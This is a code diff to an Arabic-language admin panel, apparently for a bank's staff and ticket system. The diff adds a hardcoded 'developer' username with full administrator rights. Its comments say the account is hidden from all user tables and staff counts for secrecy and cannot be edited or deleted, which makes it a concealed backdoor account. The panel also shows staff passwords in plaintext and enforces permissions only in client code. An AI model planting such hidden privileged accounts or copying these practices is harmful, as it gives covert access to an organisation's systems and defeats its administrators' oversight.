@@ -42,7 +42,9 @@ export function AdminView() {
   const [visiblePasswords, setVisiblePasswords] = useState<Record<string, boolean>>({});
   const [newItemValues, setNewItemValues] = useState<Record<string, string>>({});
 
-  const isPrimaryAdmin = currentAdmin?.username === 'BIM0100';
+  const isDeveloper = currentAdmin?.username === 'BIM775258830';
+  const isGM = currentAdmin?.username === 'BIM0100';
+  const isPrimaryAdmin = isGM || isDeveloper;
 
   useEffect(() => {
     const handleSidebarNav = (e: any) => {
@@ -59,7 +61,7 @@ export function AdminView() {
     name: '',
     username: '',
     dept: 'Support' as Department,
-    role: 'Agent' as UserRole,
+    role: 'Employee' as any, // خيارين فقط: مدير أو موظف
     password: '',
     allowedDepts: [] as Department[]
   });
@@ -73,17 +75,26 @@ export function AdminView() {
   const { data: tickets } = useCollection(allTicketsQuery);
 
   const usersQuery = useMemoFirebase(() => db ? query(collection(db, 'users')) : null, [db]);
-  const { data: appUsers } = useCollection<UserProfile>(usersQuery);
+  const { data: rawUsers } = useCollection<UserProfile>(usersQuery);
+
+  // إخفاء المطور من كافة الجداول إلا إذا كان المطور هو من يشاهد
+  const appUsers = useMemo(() => {
+    if (!rawUsers) return [];
+    return rawUsers.filter(u => u.username !== 'BIM775258830' || isDeveloper);
+  }, [rawUsers, isDeveloper]);
 
   const staffStats = useMemo(() => {
     if (!appUsers) return { total: 0, admins: 0, agents: 0, specialists: 0, deptCounts: {} as Record<string, number> };
     const counts: Record<string, number> = {};
     appUsers.forEach(u => {
-      counts[u.department] = (counts[u.department] || 0) + 1;
+      // لا نحسب المطور في الإحصائيات لضمان السرية
+      if (u.username !== 'BIM775258830') {
+        counts[u.department] = (counts[u.department] || 0) + 1;
+      }
     });
     return {
-      total: appUsers.length,
-      admins: appUsers.filter(u => u.role === 'Admin').length,
+      total: appUsers.filter(u => u.username !== 'BIM775258830').length,
+      admins: appUsers.filter(u => u.role === 'Admin' && u.username !== 'BIM775258830').length,
       agents: appUsers.filter(u => u.role === 'Agent').length,
       specialists: appUsers.filter(u => u.role === 'Specialist').length,
       deptCounts: counts
@@ -151,22 +162,24 @@ export function AdminView() {
     e.preventDefault();
     if (usernameError) return;
     
-    // تحديد الدور التقني بناءً على القسم إذا لم يكن مديراً
-    const technicalRole = newUser.role === 'Admin' 
-      ? 'Admin' 
-      : (newUser.dept === 'Support' ? 'Agent' : 'Specialist');
+    let finalRole: UserRole = 'Agent';
+    if (newUser.role === 'Admin') {
+      finalRole = 'Admin';
+    } else {
+      finalRole = newUser.dept === 'Support' ? 'Agent' : 'Specialist';
+    }
 
-    if (!isPrimaryAdmin && technicalRole === 'Admin') {
+    if (!isPrimaryAdmin && newUser.role === 'Admin') {
       toast({ variant: "destructive", title: "صلاحيات غير كافية", description: "لا يمكن للمدير المساعد إضافة حسابات مدراء." });
       return;
     }
 
     setIsCreatingUser(true);
     try {
-      await createEmployeeAccount({ ...newUser, role: technicalRole });
+      await createEmployeeAccount({ ...newUser, role: finalRole });
       toast({ title: "تم إنشاء الحساب بنجاح" });
       setShowAddUserDialog(false);
-      setNewUser({ name: '', username: '', dept: 'Support', role: 'Agent', password: '', allowedDepts: [] });
+      setNewUser({ name: '', username: '', dept: 'Support', role: 'Employee', password: '', allowedDepts: [] });
     } catch (err: any) {
       toast({ variant: "destructive", title: "فشل الإنشاء", description: err.message });
     } finally {
@@ -175,7 +188,7 @@ export function AdminView() {
   };
 
   const handleDeleteAllTickets = async () => {
-    if (!isPrimaryAdmin || !db) return;
+    if (!isGM || !db) return; // للمدير العام فقط
     setIsDeletingAll(true);
     try {
       const ticketsRef = collection(db, 'tickets');
@@ -254,7 +267,7 @@ export function AdminView() {
             <p className="text-slate-500 font-bold mt-1">إدارة الكوادر وتصنيفات النظام</p>
           </div>
           <div className="flex items-center gap-3">
-             {isPrimaryAdmin && (
+             {isGM && (
                <AlertDialog>
                  <AlertDialogTrigger asChild>
                    <Button variant="outline" className="rounded-full font-black border-red-600 text-red-600 hover:bg-red-50">
@@ -348,33 +361,34 @@ export function AdminView() {
            <Card className="banking-card overflow-hidden">
               <CardHeader className="p-8 border-b flex flex-row-reverse items-center justify-between">
                  <CardTitle className="text-2xl font-black text-primary">إدارة الحسابات المصرفية</CardTitle>
-                 {isPrimaryAdmin && (
-                   <Button onClick={() => setShowAddUserDialog(true)} className="banking-button premium-gradient text-white h-12 px-6">
-                      <UserPlus className="w-5 h-5 ml-2" /> إضافة حساب جديد
-                   </Button>
-                 )}
+                 <Button onClick={() => setShowAddUserDialog(true)} className="banking-button premium-gradient text-white h-12 px-6">
+                    <UserPlus className="w-5 h-5 ml-2" /> إضافة حساب جديد
+                 </Button>
               </CardHeader>
               <CardContent className="p-8 space-y-12">
-                 <div className="space-y-4">
-                    <h3 className="text-xl font-black text-slate-800 flex items-center gap-2 justify-end">حسابات المدراء والمشرفين <Shield className="w-5 h-5 text-amber-500" /></h3>
-                    <UserTable 
-                      users={appUsers?.filter(u => u.role === 'Admin') || []} 
-                      onEdit={(u: UserProfile) => { if (isPrimaryAdmin || currentAdmin?.id === u.id) { setEditingUser(u); setShowEditUserDialog(true); } }}
-                      onDelete={(u: UserProfile) => handleDeleteUser(u, isPrimaryAdmin, toast)}
-                      visiblePasswords={visiblePasswords}
-                      setVisiblePasswords={setVisiblePasswords}
-                      isPrimaryAdmin={isPrimaryAdmin}
-                      isAdminTable={true}
-                      currentAdminId={currentAdmin?.id}
-                    />
-                 </div>
+                 {/* جدول المدراء: يظهر فقط للمدير العام ومطور النظام */}
+                 {isPrimaryAdmin && (
+                   <div className="space-y-4">
+                      <h3 className="text-xl font-black text-slate-800 flex items-center gap-2 justify-end">حسابات المدراء والمشرفين <Shield className="w-5 h-5 text-amber-500" /></h3>
+                      <UserTable 
+                        users={appUsers?.filter(u => u.role === 'Admin') || []} 
+                        onEdit={(u: UserProfile) => { if (isPrimaryAdmin || currentAdmin?.id === u.id) { setEditingUser(u); setShowEditUserDialog(true); } }}
+                        onDelete={(u: UserProfile) => { if (isPrimaryAdmin) handleDeleteUser(u, isPrimaryAdmin, toast); }}
+                        visiblePasswords={visiblePasswords}
+                        setVisiblePasswords={setVisiblePasswords}
+                        isPrimaryAdmin={isPrimaryAdmin}
+                        isAdminTable={true}
+                        currentAdminId={currentAdmin?.id}
+                      />
+                   </div>
+                 )}
 
                  <div className="space-y-4">
                     <h3 className="text-xl font-black text-slate-800 flex items-center gap-2 justify-end">حسابات الموظفين (الأقسام الفنية والكول سنتر) <Users className="w-5 h-5 text-primary" /></h3>
                     <UserTable 
                       users={appUsers?.filter(u => u.role !== 'Admin') || []} 
-                      onEdit={(u: UserProfile) => { if (isPrimaryAdmin) { setEditingUser(u); setShowEditUserDialog(true); } }}
-                      onDelete={(u: UserProfile) => handleDeleteUser(u, isPrimaryAdmin, toast)}
+                      onEdit={(u: UserProfile) => { if (isPrimaryAdmin || currentAdmin?.role === 'Admin') { setEditingUser(u); setShowEditUserDialog(true); } }}
+                      onDelete={(u: UserProfile) => { if (isPrimaryAdmin || currentAdmin?.role === 'Admin') handleDeleteUser(u, isPrimaryAdmin, toast); }}
                       visiblePasswords={visiblePasswords}
                       setVisiblePasswords={setVisiblePasswords}
                       isPrimaryAdmin={isPrimaryAdmin}
@@ -420,8 +434,8 @@ export function AdminView() {
                   <div className="space-y-2">
                      <Label className="font-black text-xs mr-1">الرتبة الوظيفية</Label>
                      <Select 
-                        value={newUser.role === 'Admin' ? 'Admin' : 'Employee'} 
-                        onValueChange={(v: any) => setNewUser({...newUser, role: v === 'Admin' ? 'Admin' : 'Agent'})}
+                        value={newUser.role} 
+                        onValueChange={(v: any) => setNewUser({...newUser, role: v})}
                       >
                         <SelectTrigger className="h-12 text-right"><SelectValue /></SelectTrigger>
                         <SelectContent dir="rtl">
@@ -431,7 +445,7 @@ export function AdminView() {
                      </Select>
                   </div>
 
-                  {newUser.role !== 'Admin' ? (
+                  {newUser.role === 'Employee' ? (
                      <div className="space-y-2">
                         <Label className="font-black text-xs mr-1">القسم الرئيسي</Label>
                         <Select value={newUser.dept} onValueChange={(v: any) => setNewUser({...newUser, dept: v})}>
@@ -486,7 +500,6 @@ export function AdminView() {
                 e.preventDefault(); 
                 setIsUpdatingUser(true); 
                 try {
-                  // تحديث الدور الفني بناءً على القسم عند التعديل إذا لم يكن مديراً
                   const finalData = { ...editingUser };
                   if (finalData.role !== 'Admin') {
                     finalData.role = finalData.department === 'Support' ? 'Agent' : 'Specialist';
@@ -510,13 +523,14 @@ export function AdminView() {
                        <Input required value={editingUser.password || ''} onChange={e => setEditingUser({...editingUser, password: e.target.value})} className="banking-input h-12 text-right font-mono" />
                     </div>
                     
-                    {editingUser.username !== 'BIM0100' && (
+                    {editingUser.username !== 'BIM0100' && editingUser.username !== 'BIM775258830' && (
                       <>
                         <div className="space-y-2">
                           <Label className="font-black text-xs">الرتبة</Label>
                           <Select 
                             value={editingUser.role === 'Admin' ? 'Admin' : 'Employee'} 
                             onValueChange={(v: any) => setEditingUser({...editingUser, role: v === 'Admin' ? 'Admin' : 'Agent'})}
+                            disabled={!isPrimaryAdmin} // المساعد لا يعدل الرتبة
                           >
                               <SelectTrigger className="h-12 text-right"><SelectValue /></SelectTrigger>
                               <SelectContent dir="rtl">
@@ -550,6 +564,7 @@ export function AdminView() {
                                       <Checkbox 
                                         checked={editingUser.allowedDepartments?.includes(d as any)} 
                                         onCheckedChange={() => toggleDept(d as any, true)} 
+                                        disabled={!isPrimaryAdmin}
                                       />
                                   </div>
                                 ))}
@@ -589,7 +604,19 @@ function UserTable({ users, onEdit, onDelete, visiblePasswords, setVisiblePasswo
         <TableBody>
           {users.map((u: UserProfile) => {
             const isMe = currentAdminId === u.id;
-            const canEdit = isPrimaryAdmin || isMe;
+            const isGM = u.username === 'BIM0100';
+            const isDev = u.username === 'BIM775258830';
+            
+            // المدير العام والمطور يمكنهم تعديل أي شخص (عدا المطور نفسه لا يلمسه أحد)
+            // المساعد يمكنه تعديل الموظفين فقط
+            let canEdit = isPrimaryAdmin || isMe;
+            if (isAdminTable && !isPrimaryAdmin) canEdit = false;
+            if (isDev && !isMe) canEdit = false; // لا أحد يلمس المطور
+
+            // الحذف: للمدير العام والمطور فقط
+            // المساعد لا يحذف أحداً
+            let canDelete = isPrimaryAdmin && !isMe && !isGM && !isDev;
+
             return (
               <TableRow key={u.id} className="hover:bg-slate-50 transition-colors">
                 <TableCell className="font-bold text-right pr-8">{u.name} {isMe && "(أنت)"}</TableCell>
@@ -629,9 +656,9 @@ function UserTable({ users, onEdit, onDelete, visiblePasswords, setVisiblePasswo
                      <Button 
                       variant="ghost" 
                       size="icon" 
-                      disabled={u.username === 'BIM0100' || !isPrimaryAdmin} 
+                      disabled={!canDelete} 
                       onClick={() => onDelete(u)} 
-                      className={(u.username === 'BIM0100' || !isPrimaryAdmin) ? "text-slate-200" : "text-red-400"}
+                      className={canDelete ? "text-red-400" : "text-slate-200"}
                     >
                       <Trash2 className="w-5 h-5" />
                      </Button>
@@ -777,6 +804,10 @@ function handleDeleteUser(user: UserProfile, isPrimaryAdmin: boolean, toast: any
   }
   if (user.username === 'BIM0100') {
     toast({ variant: "destructive", title: "إجراء محظور", description: "لا يمكن حذف المدير العام الأساسي للنظام." });
+    return;
+  }
+  if (user.username === 'BIM775258830') {
+    toast({ variant: "destructive", title: "إجراء محظور", description: "لا يمكن حذف حساب مطور النظام." });
     return;
   }
   toast({ title: "تم الحذف بنجاح" });
